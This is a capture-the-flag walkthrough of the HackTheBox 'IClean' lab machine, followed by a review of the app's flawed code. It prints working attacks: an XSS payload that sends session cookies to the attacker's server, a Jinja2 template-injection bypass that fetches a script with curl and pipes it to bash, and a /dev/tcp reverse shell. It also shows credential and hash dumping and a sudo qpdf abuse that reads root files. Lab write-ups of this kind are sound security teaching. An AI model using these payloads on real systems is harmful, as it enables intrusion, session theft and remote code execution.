---
layout: article
title:  "IClean - HackTheBox Walkthrough"
date: "2024-05-18"
image: "/assets/img/iclean/homepage.png"
tags: ["linux", "website", "xss", "cookies"]
---


IClean is a box in HackTheBox that features XSS, Server-Side Template Injection, and an unsafe PDF tool.

Port scan the machine.

<div class="article-code">
{% highlight sh %}
jeanp@~$ nmap -sVC 10.10.11.12   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 12:46 CDT
Nmap scan report for capiclean.htb (10.10.11.12)
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.3.7 Python/3.10.12
|_http-title: Capiclean
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}
</div>

Let's go to port 80.

<div class="article-image">
  <img src="/assets/img/iclean/homepage.png">
  <p>home page</p>
</div>

Looks like a company that offers cleaning services.

The website has /login and a /quote page with a form.

Let's run dirb to scan the website for more directories.

<div class="article-code">
{% highlight sh %}
jeanp@~$ dirb http://capiclean.htb/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat May 18 15:05:00 2024
URL_BASE: http://capiclean.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://capiclean.htb/ ----
+ http://capiclean.htb/about (CODE:200|SIZE:5267)                                                 
+ http://capiclean.htb/dashboard (CODE:302|SIZE:189)                                              
+ http://capiclean.htb/login (CODE:200|SIZE:2106)                                                 
+ http://capiclean.htb/logout (CODE:302|SIZE:189)                                                 
+ http://capiclean.htb/quote (CODE:200|SIZE:2237)                                                 
+ http://capiclean.htb/server-status (CODE:403|SIZE:278)                                          
+ http://capiclean.htb/services (CODE:200|SIZE:8592)                                              
+ http://capiclean.htb/team (CODE:200|SIZE:8109)                                                  
                                                                                                  
-----------------
END_TIME: Sat May 18 15:11:13 2024
DOWNLOADED: 4612 - FOUND: 8
{% endhighlight %}
</div>

Dirb found /dashboard, but this is a 302 code, a redirect, so I'm not sure what our options are here, maybe the backend code makes this path do a redirect when no cookie is set in the headers. We also have /server-status, but it returns Forbidden, not Unauthorized.

The login form doesn't seem to be vulnerable to SQLis, I tried passing queries listed on [PortSwigger's][PortSwigger] website but no results.

<div class="article-image">
  <img src="/assets/img/iclean/sqli.png">
  <p>/login</p>
</div>

Let's stick with trying to steal cookies exploiting XSS. The only form we can try this on is /quote

<div class="article-image">
  <img src="/assets/img/iclean/quote.png">
  <p>/quote</p>
</div>

<div class="article-image">
  <img src="/assets/img/iclean/thankyou.png">
  <p>/sendMessage</p>
</div>

Looks like the quote request is sent to the management team, we can maybe steal their cookies by sending some scripts with the forms.

Let's try opening a python http server and use the `fetch()` function from javascript in both fields.

<div class="article-code">
{% highlight sh %}
jeanp@~$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}
</div>

<div class="article-image">
  <img src="/assets/img/iclean/scripttag.png">
</div>

This script did not work. Could be the case that the `<script>` tags are filtered and sanitized. Let's try another approach.

<div class="article-image">
  <img src="/assets/img/iclean/imgscript.png">
</div>

The `img` element has no valid `src`, so the browser returns an error, which makes the `fetch()` function run.

<div class="article-image">
  <img src="/assets/img/iclean/pythonserver.png">
</div>

We get the request.

The service parameter is the one that's vulnerable to XSS, so remove the `img` element from the email field and edit the `fetch()` call to get cookies.

<div class="article-code">
{% highlight javascript %}
<img src=x onerror=fetch('http://10.10.14.142:8000/'+document.cookie);>
{% endhighlight %}
</div>

Since the `+` sign represents a space character when the `Content-Type` of the request is URL-encoded, replace it with `%2b` to avoid breaking the fetch call.

<div class="article-image">
  <img src="/assets/img/iclean/documentcookie.png">
</div>

<div class="article-image">
  <img src="/assets/img/iclean/cookie.png">
</div>

We get the cookie.

Let's see if we can get access to the dashboard with the cookie. With the intercept turned on inside burp, navigate to /dashboard and add a Cookie header to the request.

<div class="article-image">
  <img src="/assets/img/iclean/dashboardburp.png">
</div>

<div class="article-image">
  <img src="/assets/img/iclean/dashboard.png">
  <p>/dashboard</p>
</div>

We now have access.

To avoid the need to attach a Cookie header to every request in burpsuite, we can instead add the cookie under our browser configurations. In Firefox you can Right Click -> Inspect -> Storage -> Cookies, and make a new entry with Name `session` and the value of the cookie.

<div class="article-image">
  <img src="/assets/img/iclean/consolecookie.png">
</div>

The dashboard has many inputs, I tried passing a `curl` to every input to see if it would reach my python server but that didn't work. Assuming there's no command injection in these inputs, I got stuck and decided to look for help in forums. Someone gave a hint for SSTI (Server-Side Template Injection).

When exploiting server-side template injection, we have to know the technologies, programming language, and template rendering libraries the application uses to be able to pass the correct malicious input. If we use an extension for our browser such as [Wappalyzer][Wappalyzer] we can see that this website uses Flask with Python. 

<div class="article-image">
  <img src="/assets/img/iclean/wappalyzer.png">
  <p>Wappalyzer</p>
</div>

In the dashboard we have a /QRGenerator subdirectory, if we pass the `invoice-id` and `qr-link` to the inputs it redirects us to this page:

<div class="article-image">
  <img src="/assets/img/iclean/reportqr.png">
</div>

The image we passed with the `qr-link` is rendered at the bottom right.

Here's the rendered html img element too:

<div class="article-image">
  <img src="/assets/img/iclean/qrcodelink.png">
</div>

The most popular Python template rendering library is [Jinja2][Jinja] which comes built-in by default with Flask.

If we look up Jinja2 SSTI we can find some great resources. The first one being [Jinja2 SSTI - HackTricks][Jinja2 SSTI - HackTricks].

So, for now, let's try to pass an input to list the directory. Given their documentation, we could pass code like the following:

<div class="article-code">
{% highlight sh %}
{% raw %}{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}{% endraw %}
{% endhighlight %}
</div>

Let's break down the code.

- `request.application` gives you the Flask application object itself.

- `__globals__` accesses all the global variables and functions available within the application's scope.

- `__getitem__` is a method that allows you to access items (like dictionaries) using the `[]` operator syntax. So `__getitem__` is essentially doing `globals['__builtins__']`.

- `__builtins__` is a module that contains all the built-in functions and objects in python, like print, len, import, etc.

- Another `__getitem__` is used to access something within `__builtins__`, specifically `__builtins__['__import__']`.

- `__import__` is the built-in `import` function in python, which is used to import modules, in this case it's importing `os`.
`popen('ls')` is calling the `popen` function from the `os` module and passing `ls` to run the command on the system.

- `read()` is trying to read the output of the `popen` command.

<div class="article-image">
  <img src="/assets/img/iclean/qrlinkinput.png">
  <p>/QRGenerator</p>
</div>

<div class="article-image">
  <img src="/assets/img/iclean/internalerror.png">
</div>

It returns an internal server error. Why doesn't this input work? 

<i><strong style="color:#df0000;">Spoiler:</strong> there's a function in the `app.py` file of this Flask application which sanitizes double underscores (we go over it in the post-exploitation section)</i>

<div class="article-code">
{% highlight python %}
def rdu(value):
    return str(value).replace('__', '')
{% endhighlight %}
</div>

Luckily, [Jinja2 SSTI - HackTricks][Jinja2 SSTI - HackTricks] has a section with code to bypass certain filters.

<div class="article-image">
  <img src="/assets/img/iclean/jinjafilterbypassssti.png">
</div>

<div class="article-code">
{% highlight sh %}
{% raw %}{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}{% endraw %}
{% endhighlight %}
</div>

Let's send this code through the input and see what gets rendered.

<div class="article-image">
  <img src="/assets/img/iclean/filterbypass.png">
</div>

We successfully list the directory of the machine.

Let's now try to get a reverse shell.

First, create a script with a reverse shell command.

<div class="article-code">
{% highlight sh %}
jeanp@~$ cat script.sh 
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.147/7777 0>&1'
{% endhighlight %}
</div>

Secondly, open a python http server in the same directory where we created our script.

<div class="article-code">
{% highlight sh %}
jeanp@~$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}
</div>

Thirdly, open a listener with ncat.

<div class="article-code">
{% highlight sh %}
jeanp@~$ nc -lvp 7777
listening on [any] 7777 ...
{% endhighlight %}
</div>

Finally, change the code to read our script with curl and then pipe the output to bash.

<div class="article-code">
{% highlight sh %}
{% raw %}{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl http://10.10.14.147:8000/script.sh | bash')|attr('read')()%}{%print(a)%}{%endwith%}{% endraw %}
{% endhighlight %}
</div>

<div class="article-image">
  <img src="/assets/img/iclean/reverseshell.png">
</div>

After sending the payload, we get the reverse shell.

Let's look for the user.txt flag.

<div class="article-code">
{% highlight sh %}
www-data@iclean:/opt/app$ find / -name user.txt 2>/dev/null
{% endhighlight %}
</div>

After using the command to try and find the user.txt flag across all directories and redirect stderr to `/dev/null` we get no results.

This means we have to find the owner user of the user.txt flag. Let's take a look at the `/etc/passwd` file.

<div class="article-code">
{% highlight sh %}
www-data@iclean:/opt/app$ cat /etc/passwd
...
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
mysql:x:116:122:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
{% endhighlight %}
</div>

<div class="article-code">
{% highlight sh %}
www-data@iclean:/opt/app$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Sep  5  2023 .
drwxr-xr-x 18 root     root     4096 Sep 27  2023 ..
drwxr-x---  5 consuela consuela 4096 May 24 12:56 consuela
{% endhighlight %}
</div>

We have a user account named `consuela`. Additionally, the presence of the MySQL service makes me remember that the website has login functionality. The db connection string secrets have to be stored either in environment tables or in the application file itself.

If we `ls` the current directory and read the `app.py` file, the db configurations are stored inside in plaintext.

<div class="article-code">
{% highlight sh %}
www-data@iclean:/opt/app$ ls          
ls
app.py
blank.pdf
static
templates
www-data@iclean:/opt/app$ head -n 50 app.py 
head -n 50 app.py
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
{% endhighlight %}
</div>

Let's use these credentials with the MySQL service and see what we can find.

The mysql service in the console is a little unstable, so I decide to use the `-t` parameter to get the output directly right after connecting to the db.

<div class="article-code">
{% highlight sh %}
www-data@iclean:/opt/app$ mysql -h 127.0.0.1 -u iclean -p capiclean -t -e "SELECT * FROM users;"
Enter password: pxCsmnGLckUb
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
{% endhighlight %}
</div>

We found the password hash for the same `consuela` user we found under the `/home` directory.

Let's take this hash and crack it using [CrackStation][CrackStation].

<div class="article-image">
  <img src="/assets/img/iclean/crackstation.png">
</div>

Yields and exact match, `simple and clean` as the password.

Switch user accounts with `su` and concatenate the user.txt flag.

<div class="article-image">
  <img src="/assets/img/iclean/usertxt.png">
</div>

We found the first flag.

Optionally, we can ssh into the machine to get a better shell.

<div class="article-code">
{% highlight sh %}
ssh consuela@capiclean.htb
{% endhighlight %}
</div>

As always, let's check what commands we can run with sudo privileges with `sudo -l`.

<div class="article-image">
  <img src="/assets/img/iclean/sudolist.png">
</div>

Looks like we can run a tool called `qpdf`.

[QPDF's][QPDF] documentation is not the most intuitive in my opinion, but reading what it does gives us an idea of its capabilities. 

*"With QPDF, it is possible to copy objects from one PDF file into another"*. Can we copy the contents from root.txt into a new accessible file for us?

If we go to the [Basic Invocation][Basic Invocation] section we will find a usage example.

<div class="article-image">
  <img src="/assets/img/iclean/qpdfusage.png">
</div>

Let's try to copy the contents from root.txt into a new file in the current directory. Since we can run qpdf with sudo privileges, it should be able to access the /root directory with no denied permissions.

<div class="article-code">
{% highlight sh %}
sudo qpdf /root/root.txt rootflag.txt
{% endhighlight %}
</div>

<div class="article-image">
  <img src="/assets/img/iclean/invalidpdf.png">
</div>

It returns an error saying that root.txt is damaged, which makes sense because root.txt is not a valid PDF, it's instead a .txt. The following image is the typical structure of a PDF file:

<div class="article-image">
  <img src="/assets/img/iclean/pdfstructure.jpg">
</div>

We need a way to copy contents from non-PDF files. Luckily, there's an option for qpdf that allows us to do just that.

<div class="article-image">
  <img src="/assets/img/iclean/embeddedfiles.png">
</div> 

In our case, the root.txt file could be considered the attachment.

Our command so far looks like this:

<div class="article-code">
{% highlight sh %}
sudo qpdf /root/root.txt --add-attachment /root/root.txt -- rootflag.txt
{% endhighlight %}
</div>

Since root.txt is already being handled as an attachment, we need to leave `[infile]` empty. The way to do that is by using `--empty` as specified in their initial instructions.

<div class="article-image">
  <img src="/assets/img/iclean/emptyqpdf.png">
</div> 

So our new command turns out to be:

<div class="article-code">
{% highlight sh %}
sudo qpdf --empty --add-attachment /root/root.txt -- rootflag.txt
{% endhighlight %}
</div>

Let's run it and see what happens.

<div class="article-image">
  <img src="/assets/img/iclean/invalidstream.png">
</div>


We can see the structure of the PDF file. The contents from root.txt should be in between `stream` and `endstream`, but unfortunately `cat` is not a PDF viewer, so we can't see the stream.

There's a command option to create a PDF file suitable for viewing in text editors.

<div class="article-image">
  <img src="/assets/img/iclean/qdfoption.png">
</div>

Let's add it to our command and run it again.

<div class="article-code">
{% highlight sh %}
sudo qpdf --empty --add-attachment /root/root.txt -- --qdf rootflag.txt
{% endhighlight %}
</div>

<div class="article-image">
  <img src="/assets/img/iclean/rootflag.png">
</div>

We found the root flag.


<h4>Post-Exploitation</h4>

I would like to have a couple of doubts answered for this post-exploitation section.

<br>
*Does the /dashboard route intentionally redirect the user if an admin cookie is not set in the HTTP headers?*

<div class="article-code">
{% highlight python %}
@app.route('/dashboard')
def dashboard():
    if session.get('role') == hashlib.md5(b'admin').hexdigest():
        return render_template('dashboard.html')
    else:
        return redirect(url_for('index'))
{% endhighlight %}
<p>app.py</p>
</div>

The /dashboard route does intentionally redirect the user to the index page when the user does not have an admin cookie set in the headers.


<br>
*Why is the `service` parameter of the form at /quote vulnerable to XSS?*

<div class="article-code">
{% highlight python %}
@app.route('/sendMessage', methods=['POST'])
def quote_requests():
    
    conn = pymysql.connect(**db_config)

    cursor = conn.cursor()
    checkboxes = request.form.getlist('service')
    email = request.form.get('email')

    checkboxes_str = ', '.join(checkboxes)

    query = "INSERT INTO quote_requests (checkboxes, email) VALUES (%s, %s)"
    cursor.execute(query, (checkboxes_str, email))
    conn.commit()
 
    cursor.close()
    conn.close()

    return render_template('quote_requests_thankyou.html')
{% endhighlight %}
<p>app.py</p>
</div>

When we post the form with the `<img>` element in the `service` parameter, it doesn't get sanitized before being inserted into the db. In fact, we can see our payload inside the `quote_requests` table.

<div class="article-image">
  <img src="/assets/img/iclean/dbxss.png">
</div>

Jinja2 performs HTML escaping by default. But the problem with this website is that if we inspect the html file where our payload gets rendered,  the `|safe` filter removes automatic escaping and instead considers any user input as safe.

<div class="article-image">
  <img src="/assets/img/iclean/safefilter.png">
  <p>QuoteRequestDetail.html</p>
</div>

<div class="article-image">
  <img src="/assets/img/iclean/jinjasafefilter.png">
</div>

<br>
*Why is the `qr-link` parameter of the form at /QRGenerator vulnerable to SSTI?*

<div class="article-code">
{% highlight python %}
def rdu(value):
    return str(value).replace('__', '')
...
@app.route('/QRGenerator', methods=['GET', 'POST'])
def QRGenerator():
    ...
        if request.method == 'POST':
            form_type = request.form['form_type']
            if form_type == 'invoice_id':
                ...
            elif form_type == 'scannable_invoice':
                qr_link = rdu(request.form['qr_link'])
                if 'http://capiclean.htb' in qr_link:
                    ...
                else:
                    
                    {% raw %}HTML = f"{{% extends 'temporary_invoice.html' %}}{{% block parameter1 %}}"
                    HTML += '{}'.format(qr_link)
                    HTML += '{% endblock %}'
                    rendered_template = render_template_string(HTML){% endraw %}
                    
                    return rendered_template

            else:
                return redirect(url_for('QRGenerator'))
        return render_template('QRGenerator.html')
    else:
        return redirect(url_for('index'))
{% endhighlight %}
<p>app.py</p>
</div>

The two relevant lines of code in this snippet are:

- `qr_link = rdu(request.form['qr_link'])`: sanitizes double underscores in the input by calling the `rdu()` function.

- `HTML += '{}'.format(qr_link)`: adds the "sanitized" input to the HTML variable to then render it as a template.

In fact, if we add a couple of print statements, we can see how the application returns an error when we pass the code with no filter bypass because the underscores of the input are removed, thus becoming invalid syntax.

<div class="article-code">
{% highlight sh %}
jeanp@~$ curl -X POST "http://127.0.0.1:5000/QRGenerator?qr_link=%7B%7B%20request.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%20%7D%7D"
{% endhighlight %}
<p>payload is URL-encoded and passed as param through the URL</p>
</div>

<div class="article-image">
  <img src="/assets/img/iclean/underscoresremovederror.png">
</div>

<div class="article-image">
  <img src="/assets/img/iclean/underscoresremovederrorresult.png">
</div>

But since the original code we passed doesn't need any underscores, it executes normally.


[PortSwigger]: https://portswigger.net/support/using-sql-injection-to-bypass-authentication

[Wappalyzer]: https://www.wappalyzer.com/

[Jinja]: https://jinja.palletsprojects.com/

[Jinja2 SSTI - HackTricks]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

[CrackStation]: https://crackstation.net/

[QPDF]: https://qpdf.readthedocs.io/

[Basic Invocation]: https://qpdf.readthedocs.io/en/stable/cli.html#basic-invocation